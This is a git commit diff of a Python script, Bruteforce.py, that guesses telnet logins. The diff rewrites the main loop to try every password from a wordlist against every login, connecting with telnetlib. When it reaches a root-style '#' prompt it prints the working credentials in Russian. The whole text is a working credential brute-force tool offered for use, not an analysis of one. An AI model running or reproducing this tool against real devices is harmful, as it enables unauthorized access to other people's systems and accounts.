5d976995752ad24e92b5affd114650abd51de6c9
AlexeyCamacho <56472111+AlexeyCamacho@users.noreply.github.com>
2022-12-28 15:25:44 +0400

    Update Bruteforce.py

--- Bruteforce.py
+++ Bruteforce.py
@@ -29,22 +29,33 @@ for password in paswords_:
     passwords.append(password.strip())
 passwordsFile.close
 
+successful = False
+
 
 for i in range(len(logins)):
-    tn = telnetlib.Telnet(host, port)
-
-    tn.read_until(b"Username")
-    tn.write(logins[i].encode('ascii') + b"\n")
-    tn.read_until(b"Password")
-    tn.write(passwords[i].encode('ascii') + b"\n")
-
-    regex_idx, match, output = tn.expect([faled.encode('utf-8'), b"#"])
-
-    if (regex_idx == 0):
-        time.sleep(3)
-        continue
-    else:
-        print("Пароль подобран")
-        print("Login: ", logins[i], " Password: ", passwords[i])
+    
+    if successful:
         break
- 
+    
+    for j in range(len(passwords)):
+        
+        tn = telnetlib.Telnet(host, port)
+
+        tn.read_until(b"Username")
+        tn.write(logins[i].encode('ascii') + b"\n")
+        tn.read_until(b"Password")
+        tn.write(passwords[j].encode('ascii') + b"\n")
+
+        regex_idx, match, output = tn.expect([faled.encode('utf-8'), b"#"])
+
+        if (regex_idx == 0):
+            time.sleep(3)
+            continue
+        else:
+            successful = True
+            print("Пароль подобран")
+            print("Login: ", logins[i], " Password: ", passwords[j])
+            break
+
+if not successful:
+    print("Указанные логины и пароли не верные") 
